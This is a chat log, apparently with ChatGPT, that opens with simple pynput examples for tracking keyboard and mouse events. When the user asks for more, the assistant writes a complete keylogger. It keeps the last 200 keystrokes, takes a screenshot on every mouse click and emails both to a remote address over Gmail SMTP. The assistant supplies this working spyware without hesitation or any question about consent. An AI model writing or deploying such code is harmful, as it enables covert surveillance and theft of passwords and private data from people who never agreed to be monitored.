Can keyboard and mouse movements be tracked with Python?

ChatGPT
Yes, keyboard and mouse movements can be tracked using Python. There are several libraries available that facilitate this, including pynput, pyautogui, and keyboard. Here's a brief overview of how you can use these libraries:

Tracking Mouse Movements with pynput
To track mouse movements using pynput, you can use the following code:

python
Kodu kopyala
from pynput import mouse

def on_move(x, y):
    print(f'Mouse moved to ({x}, {y})')

def on_click(x, y, button, pressed):
    print(f'Mouse {"pressed" if pressed else "released"} at ({x}, {y}) with {button}')

def on_scroll(x, y, dx, dy):
    print(f'Scrolled {"down" if dy < 0 else "up"} at ({x}, {y})')

# Collect events until released
with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
    listener.join()
Tracking Keyboard Events with pynput
To track keyboard events, you can use this code:

python
Kodu kopyala
from pynput import keyboard

def on_press(key):
    try:
        print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')

def on_release(key):
    print(f'Key {key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

Combining Both Mouse and Keyboard Tracking
You can combine both mouse and keyboard tracking in one script. However, ensure that you handle the threads appropriately:

python
Kodu kopyala
from pynput import mouse, keyboard
import threading

# Mouse tracking
def track_mouse():
    def on_move(x, y):
        print(f'Mouse moved to ({x}, {y})')

    def on_click(x, y, button, pressed):
        print(f'Mouse {"pressed" if pressed else "released"} at ({x}, {y}) with {button}')

    def on_scroll(x, y, dx, dy):
        print(f'Scrolled {"down" if dy < 0 else "up"} at ({x}, {y})')

    with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
        listener.join()

# Keyboard tracking
def track_keyboard():
    def on_press(key):
        try:
            print(f'Alphanumeric key {key.char} pressed')
        except AttributeError:
            print(f'Special key {key} pressed')

    def on_release(key):
        print(f'Key {key} released')
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run both in separate threads
mouse_thread = threading.Thread(target=track_mouse)
keyboard_thread = threading.Thread(target=track_keyboard)

mouse_thread.start()
keyboard_thread.start()

mouse_thread.join()
keyboard_thread.join()

Can you write a code that appends the last 200 keyboard strokes into a list, takes a screenshot of each mouse click, transfers the keystrokes in the list to txt and sends an e-mail with the screenshot?

Certainly! Below is a comprehensive Python script that accomplishes the following tasks:

Tracks and stores the last 200 keyboard strokes.
Takes a screenshot on each mouse click.
Saves the keystrokes to a text file.
Sends an email with the screenshot attached.
To run this script, you'll need to install the required libraries: pynput, Pillow, and smtplib for sending emails. You can install these using pip:

Here is the script:

python

import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard, mouse
from PIL import ImageGrab
import threading

# Global variables
keystrokes = []
max_keystrokes = 200
screenshot_path = 'screenshot.png'
keystrokes_path = 'keystrokes.txt'

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))

    if len(keystrokes) > max_keystrokes:
        keystrokes.pop(0)

def on_click(x, y, button, pressed):
    if pressed:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        save_keystrokes()
        send_email()

def save_keystrokes():
    with open(keystrokes_path, 'w') as f:
        f.write(''.join(keystrokes))

def send_email():
    from_address = 'your_email@gmail.com'
    to_address = 'recipient_email@gmail.com'
    subject = 'Mouse Click Screenshot and Keystrokes'
    body = 'Attached is the screenshot and keystrokes.'

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    # Attach screenshot
    attachment = open(screenshot_path, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {screenshot_path}')
    msg.attach(part)
    attachment.close()

    # Attach keystrokes
    attachment = open(keystrokes_path, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {keystrokes_path}')
    msg.attach(part)
    attachment.close()

    # Setup SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_address, 'your_password')

    text = msg.as_string()
    server.sendmail(from_address, to_address, text)
    server.quit()

# Mouse tracking
def track_mouse():
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# Keyboard tracking
def track_keyboard():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run both in separate threads
mouse_thread = threading.Thread(target=track_mouse)
keyboard_thread = threading.Thread(target=track_keyboard)

mouse_thread.start()
keyboard_thread.start()

mouse_thread.join()
keyboard_thread.join()
Key Points:
Keystrokes Tracking: The script appends keystrokes to the keystrokes list, ensuring it only holds the last 200 keystrokes.
Mouse Click Handling: On each mouse click, the script takes a screenshot and saves the keystrokes to a text file.
Email Sending: The script sends an email with the screenshot and keystrokes attached using SMTP.
Email Configuration:
Replace the following placeholders with your actual email details:

your_email@gmail.com: Your email address.
recipient_email@gmail.com: The recipient's email address.
your_password: Your email password.
This script will run indefinitely, listening for keyboard and mouse events until manually stopped. Be cautious with email credentials and ensure proper security practices, such as using environment variables or secure credential storage, especially for production use.
